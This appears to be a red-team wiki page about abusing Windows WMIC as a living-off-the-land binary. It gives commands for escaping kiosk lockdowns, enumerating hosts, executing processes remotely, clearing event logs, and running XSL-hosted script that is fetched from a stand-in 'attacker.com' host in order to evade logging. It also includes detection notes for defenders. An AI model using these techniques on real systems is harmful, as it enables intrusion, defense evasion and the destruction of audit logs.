---
title: WMIC
permalink: /wiki/offsec-notes/entities/wmic/
layout: single
author_profile: true
tags:
- offsec-notes
- tool
---

**Category:** LOLBin / Post-Exploitation Shell
**MITRE ATT&CK:** T1047 — Windows Management Instrumentation; T1059.003 — Windows Command Shell (as a substitute)
**Related:** [Evasion Techniques](/wiki/offsec-notes/concepts/evasion-techniques/), [Lateral Movement](/wiki/offsec-notes/concepts/lateral-movement/), [Post Exploitation](/wiki/offsec-notes/concepts/post-exploitation/)

## Overview
WMIC (Windows Management Instrumentation Command-line) is a built-in Windows binary that provides an interactive shell and a rich interface to WMI. When cmd.exe and PowerShell are blocked (kiosk/terminal server lockdowns), wmic.exe often remains accessible. It is deprecated in modern Windows but still present and functional.

Binary path: `C:\Windows\System32\wbem\wmic.exe`

Note: WMIC is being removed in future Windows versions — see Microsoft's deprecation notice.

## As a Shell When cmd/PowerShell Are Blocked

In locked-down terminal server and kiosk environments, WMIC provides an interactive shell:
```
# Launch the interactive WMIC shell
C:\Windows\System32\wbem\wmic.exe
wmic>
```

ftp.exe's `!` trick doesn't work when cmd.exe is blocked (ftp uses cmd internally). WMIC does not depend on cmd.exe.

## Essential Command Reference

### Process Execution
```
# Start a process
process call create "notepad.exe"
process call create "cmd.exe /c whoami > C:\temp\out.txt"

# Kill a process by PID
path win32_process where processid=1234 call terminate

# Get process info
process get Caption,ProcessId,ExecutablePath /format:list
path win32_process where "name='chrome.exe'" get caption,executablepath,processid
```

### System Enumeration
```
# System info
computersystem get name, manufacturer, model, totalphysicalmemory
os get Caption, Version, OSArchitecture
bios get name, version, serialnumber

# Network
nicconfig get description,ipaddress,macaddress
nicconfig where ipenabled=true get ipaddress, ipsubnet, defaultipgateway, dnsserversearchorder

# Users and services
useraccount get *
service get * /format:list
service where (state="running") get caption, name, startmode, state

# Software
product get name,version,vendor

# Persistence
startup get caption,command,location
share get name,path
environment get name,variablevalue
```

### Registry Operations
```
# List subkeys
class stdregprov call enumkey hDefKey=&H80000002 sSubKeyName="Software\microsoft\windows\currentversion\uninstall"

# Read a value
class stdregprov call getstringvalue hDefKey=&H80000002 sSubKeyName="SOFTWARE\Microsoft\Windows NT\CurrentVersion" sValueName="ProductName"

# List values under a key
class stdregprov call EnumValues hDefKey=&H80000002 sSubKeyName="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

Registry hive hex values:
| Hive | Hex |
|------|-----|
| HKCR | &H80000000 |
| HKCU | &H80000001 |
| HKLM | &H80000002 |
| HKU  | &H80000003 |
| HKCC | &H80000005 |

### Output Redirection
```
# Redirect to file
/output:C:\temp\out.txt service get *

# Redirect to clipboard
/output:clipboard process get Caption,ProcessId
```

### Remote Execution
```
# Run on remote system (prompts for password)
/node:"192.168.1.100" process call create "notepad.exe"

# With alternate credentials
/node:"192.168.1.100" /user:"DOMAIN\administrator" process call create "notepad.exe"
```

### XSL Stylesheet Code Execution
Execute VBScript/JScript via the `/format` switch — bypasses script block logging since it uses XSLT processing, not PowerShell:

```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform"
    xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "calc.exe"
    ]]>
    </ms:script>
</stylesheet>
```

Execute from WMIC shell:
```
process get brief /format:"C:\temp\payload.xsl"
```
Or host remotely:
```
process get brief /format:"http://attacker.com/payload.xsl"
```

### Useful Misc
```
# Clear event log
nteventlog where filename='system' call cleareventlog

# List files
path CIM_DataFile where "Drive='C:' AND Path='\\'" get Name,CreationDate

# Disk info
diskdrive get name,size,model
```

## Detection Notes
- WMIC spawning child processes (especially cmd.exe, PowerShell, or unusual executables) is a strong indicator.
- `/format` with HTTP URLs is an established LOLBin technique — often flagged by EDR.
- Interactive WMIC shell may not generate typical script block logging.
- WMIC deprecation means its presence and use in new environments should be investigated.

## References
- TrustedSec — "Command Line Underdog: WMIC in Action" (2025-01-14)
- Microsoft WMIC deprecation notice
- LOLBAS Project — wmic.exe
